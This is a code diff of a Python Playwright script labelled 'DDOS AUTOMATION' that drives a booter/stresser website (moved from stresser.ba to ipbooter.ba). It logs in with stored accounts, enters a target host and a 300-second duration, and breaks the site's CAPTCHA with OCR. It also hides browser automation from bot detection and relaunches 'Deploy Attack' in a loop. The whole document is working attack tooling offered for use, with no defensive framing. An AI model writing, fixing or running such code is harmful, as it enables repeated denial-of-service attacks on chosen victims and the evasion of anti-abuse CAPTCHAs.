@@ -7,7 +7,7 @@ import io
 import shutil
 import sys
 import logging
-from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout, expect
+from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
 from PIL import Image
 import ddddocr
 
@@ -39,36 +39,22 @@ class DDoSNowManager:
                         logger.info(f"Hesap yüklendi: {p[0]} -> {p[2]}")
         return accounts
 
-    def wait_for_element(self, page, selector, timeout=30000):
-        """Element görünene kadar bekle"""
-        try:
-            page.wait_for_selector(selector, timeout=timeout, state="visible")
-            return True
-        except:
-            return False
-
     def solve_captcha(self, page):
         try:
-            # Deploy butonunu bekle ve tıkla
-            if not self.wait_for_element(page, "button:has-text('Deploy Attack')"):
-                logger.warning("Deploy butonu bulunamadı!")
-                return False
-            
-            deploy_btn = page.locator("button:has-text('Deploy Attack')").first
-            deploy_btn.click()
-            time.sleep(2)
+            first_deploy = page.locator("button.btn-confirm:has-text('Deploy Attack')").first
+            first_deploy.click()
+            time.sleep(3)
         except Exception as e:
             logger.warning(f"Deploy butonu hatası: {e}")
             return False
 
         while True:
             try:
-                # Captcha görselini bekle
-                if not self.wait_for_element(page, "img[alt='captcha']", 10000):
+                img_elem = page.locator("img[alt='captcha']").first
+                if img_elem.count() == 0:
                     time.sleep(1)
                     continue
                     
-                img_elem = page.locator("img[alt='captcha']").first
                 img_src = img_elem.get_attribute("src")
                 if not img_src or not img_src.startswith("data:image"):
                     time.sleep(1)
@@ -87,21 +73,18 @@ class DDoSNowManager:
 
                 logger.info(f"OCR: {captcha_text}")
 
-                # Captcha input
                 captcha_input = page.locator("input[name='captcha']").first
                 captcha_input.fill("")
                 captcha_input.fill(captcha_text)
                 time.sleep(1)
 
-                # Deploy butonu
-                deploy_btn2 = page.locator("button[type='submit']").first
-                if deploy_btn2.count() == 0:
-                    deploy_btn2 = page.locator("button:has-text('Deploy Attack')").last
-                deploy_btn2.click()
+                second_deploy = page.locator("button[type='submit'][form='hubForm']").first
+                if second_deploy.count() == 0:
+                    second_deploy = page.locator("button.btn-confirm:has-text('Deploy Attack')").last
+                second_deploy.click()
                 time.sleep(3)
 
-                # Hata kontrolü
-                if page.locator("text=Invalid captcha").count() > 0:
+                if page.locator("text=Invalid captcha code").count() > 0:
                     logger.info(f"Yanlış captcha: {captcha_text}")
                     captcha_input.fill("")
                     time.sleep(1)
@@ -135,31 +118,42 @@ class DDoSNowManager:
                         headless=True,
                         args=['--no-sandbox', '--disable-setuid-sandbox'],
                         viewport={"width": 1280, "height": 720},
-                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
+                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                     )
                     page = context.new_page()
                     page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")
 
-                    # GİRİŞ - stresser.ba domain'i
+                    # GİRİŞ
                     logger.info(f"[{username}] Giriş sayfası...")
-                    page.goto("https://stresser.ba/login", timeout=60000)
+                    page.goto("https://ipbooter.ba/login", timeout=60000)
                     page.wait_for_load_state("networkidle", timeout=30000)
-                    time.sleep(3)
-                    
-                    # Login formunu bekle
-                    if not self.wait_for_element(page, "input[name='username']"):
-                        logger.error(f"[{username}] Login formu bulunamadı!")
-                        time.sleep(30)
-                        continue
-                    
-                    page.fill("input[name='username']", username)
-                    page.fill("input[name='password']", password)
-                    page.click("button[type='submit']")
                     time.sleep(5)
                     
-                    # Hub'a git
+                    # Login formu
+                    try:
+                        page.fill("input[name='username']", username, timeout=30000)
+                        page.fill("input[name='password']", password, timeout=30000)
+                        page.click("button[type='submit']", timeout=30000)
+                        logger.info(f"[{username}] Giriş butonuna tıklandı")
+                    except Exception as e:
+                        logger.error(f"[{username}] Login hatası: {e}")
+                        time.sleep(10)
+                        continue
+                    
+                    time.sleep(5)
+                    
+                    # "Got it" butonu varsa tıkla
+                    try:
+                        got_it = page.locator("button:has-text('Got it')").first
+                        if got_it.count() > 0:
+                            got_it.click()
+                            time.sleep(2)
+                    except:
+                        pass
+                    
+                    # Hub sayfası
                     logger.info(f"[{username}] Hub sayfasına gidiliyor...")
-                    page.goto("https://stresser.ba/hub", timeout=60000)
+                    page.goto("https://ipbooter.ba/hub", timeout=60000)
                     page.wait_for_load_state("networkidle", timeout=30000)
                     time.sleep(5)
                     
@@ -173,30 +167,14 @@ class DDoSNowManager:
                     # ANA DÖNGÜ
                     while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                         try:
-                            # Hub sayfasının yüklenmesini bekle
-                            page.wait_for_load_state("networkidle", timeout=30000)
-                            time.sleep(2)
-                            
-                            # Hedef URL inputunu bul
-                            target_input = page.locator("input[placeholder*='IPv4']").first
-                            if target_input.count() == 0:
-                                target_input = page.locator("input[placeholder*='URL']").first
-                            if target_input.count() == 0:
-                                target_input = page.locator("input[name*='host']").first
-                            if target_input.count() == 0:
-                                target_input = page.locator("input").nth(0)
-                            
-                            target_input.fill(target_url, timeout=10000)
+                            # Hedef URL - name="hub.0.host"
+                            target_input = page.locator("input[name='hub.0.host']").first
+                            target_input.fill(target_url, timeout=30000)
                             logger.info(f"[{username}] Hedef URL dolduruldu: {target_url}")
                             
-                            # Süre inputu - slider
-                            time_input = page.locator("input[type='range']").first
-                            if time_input.count() == 0:
-                                time_input = page.locator("input[name*='time']").first
-                            if time_input.count() == 0:
-                                time_input = page.locator("input").nth(1)
-                            
-                            time_input.fill("300", timeout=5000)
+                            # Süre - id="hub.0.time" (css selector ile)
+                            time_input = page.locator("input[id='hub.0.time']").first
+                            time_input.fill("300", timeout=30000)
                             logger.info(f"[{username}] Süre dolduruldu: 300")
                             
                             # CAPTCHA çöz
@@ -207,33 +185,25 @@ class DDoSNowManager:
                                 time.sleep(5)
                                 continue
 
-                            logger.info(f"[{username}] Attack başladı! - {target_url}")
+                            logger.info(f"[{username}] Attack başladı!")
                             
                             # Süre takibi
-                            attack_running = True
-                            while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()) and attack_running:
+                            while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                                 try:
-                                    # Badge kontrolü
-                                    badge = page.locator(".badge").first
+                                    badge = page.locator(".accordion-button .badge").first
                                     if badge.count() > 0:
                                         time_text = badge.text_content().strip()
-                                        if time_text and "s" in time_text:
-                                            logger.info(f"[{username}] Kalan süre: {time_text}")
-                                        if time_text in ["0m 0s", "0s", "0"]:
-                                            logger.info(f"[{username}] Süre doldu!")
-                                            attack_running = False
+                                        logger.info(f"[{username}] Kalan süre: {time_text}")
+                                        if time_text == "0m 0s" or time_text == "0s":
+                                            logger.info("Süre doldu!")
                                             break
-                                    
-                                    # Running kontrolü
-                                    running = page.locator("text=Running").first
-                                    if running.count() == 0:
-                                        running = page.locator(".text-success").first
+                                    else:
+                                        running = page.locator(".stats-content .badge:has-text('Running')").first
                                         if running.count() == 0:
-                                            logger.info(f"[{username}] Attack bitti!")
-                                            attack_running = False
+                                            logger.info("Attack bitti!")
                                             break
-                                except Exception as e:
-                                    logger.debug(f"[{username}] Süre kontrol hatası: {e}")
+                                except:
+                                    pass
                                 time.sleep(5)
 
                             if not self.running_states.get(acc_id, False):
@@ -242,9 +212,12 @@ class DDoSNowManager:
                             logger.info(f"[{username}] Yeniden başlatılıyor...")
                             page.reload()
                             time.sleep(5)
+                            if "/hub" not in page.url:
+                                page.goto("https://ipbooter.ba/hub")
+                                time.sleep(3)
 
                         except Exception as inner_e:
-                            logger.error(f"[{username}] Adım hatası: {inner_e}")
+                            logger.error(f"[{username}] İşlem hatası: {inner_e}")
                             page.reload()
                             time.sleep(5)
                             continue
@@ -288,7 +261,7 @@ class DDoSNowManager:
 if __name__ == "__main__":
     print("""
     ╔═══════════════════════════════════════════╗
-    ║   STRESSER.BA - DDOS AUTOMATION           ║
+    ║   IPBOOTER.BA - DDOS AUTOMATION           ║
     ╚═══════════════════════════════════════════╝
     """)
     manager = DDoSNowManager()
